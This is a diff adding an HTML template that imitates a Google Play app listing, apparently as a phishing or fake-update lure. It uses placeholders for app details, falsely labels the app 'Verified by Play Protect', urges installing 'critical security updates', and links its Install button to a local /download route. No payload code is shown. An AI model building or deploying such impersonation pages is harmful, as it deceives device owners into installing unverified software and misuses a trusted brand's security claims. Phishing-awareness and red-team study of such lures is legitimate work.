@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>{{ app_name }} - Apps on Google Play</title>
+<link rel="stylesheet" href="/static/style.css">
+</head>
+<body class="gplay">
+<div class="gp-header">
+  <div class="gp-search">Search for apps &amp; games</div>
+</div>
+
+<div class="gp-app">
+  <div class="gp-icon">
+    <div class="gp-icon-inner">🔒</div>
+  </div>
+  <div class="gp-info">
+    <h1>{{ app_name }}</h1>
+    <p class="gp-dev">{{ developer }}</p>
+    <p class="gp-stats"><span>{{ rating }} ★</span> · {{ downloads }} downloads</p>
+  </div>
+</div>
+
+<div class="gp-install">
+  <a href="/download" class="gp-btn">Install</a>
+  <p class="gp-note">Safe · Verified by Play Protect</p>
+</div>
+
+<div class="gp-desc">
+  <h2>About this app</h2>
+  <p>This app provides critical security updates for your device. Install to keep your phone protected against the latest threats.</p>
+
+  <h2>What's new</h2>
+  <p>• Critical security patches<br>• Performance improvements<br>• Bug fixes</p>
+</div>
+
+<div class="gp-footer">
+  <p>Google Play</p>
+</div>
+</body>
+</html>
